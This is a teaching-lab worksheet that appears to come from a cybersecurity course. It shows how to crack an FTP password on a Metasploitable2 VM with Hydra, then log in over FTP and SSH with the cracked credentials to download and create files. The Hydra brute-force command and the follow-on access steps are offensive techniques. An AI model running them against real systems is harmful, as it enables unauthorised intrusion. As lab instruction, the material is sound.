Experiment 6 — Password Strength Assessment using Hydra

Aim
To perform password cracking using Hydra tool on FTP and SSH services.

--------------------------------------------------

Step 1: Start Machines
- Start Kali Linux VM
- Start Metasploitable2 VM

--------------------------------------------------

Step 2: Locate Password Dictionary

In Kali terminal:
locate unix_passwords.txt

--------------------------------------------------

Step 3: Edit Dictionary (if needed)

Open file:
vi /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt

Add:
msfadmin

Save and exit.

--------------------------------------------------

Step 4: Run Hydra Password Cracking

Command:
hydra -l msfadmin -P /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt ftp://192.168.62.137

Observation:
- Hydra matches password successfully.
- Password found: msfadmin

--------------------------------------------------

Step 5: Connect using FTP

Command:
ftp 192.168.62.137

Enter:
Username: msfadmin
Password: msfadmin

--------------------------------------------------

Step 6: FTP Navigation Commands

ls
cd vulnerable
cd twiki20030201

--------------------------------------------------

Step 7: Download File from Target

get TWiki20030201.tar.gz

Observation:
- File transferred successfully from target machine.

--------------------------------------------------

SSH Connection

Step 8: Connect using SSH

Command:
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.62.137

Enter password:
msfadmin

Observation:
- SSH login successful.

--------------------------------------------------

Step 9: Execute Commands in Target Machine

ls
cd /home
echo "Welcome to Cyber Security Lab" > 1.txt
cat 1.txt

Observation:
- File created successfully in target system.

--------------------------------------------------

Result
Successfully performed password cracking using Hydra and accessed FTP and SSH services using cracked credentials.
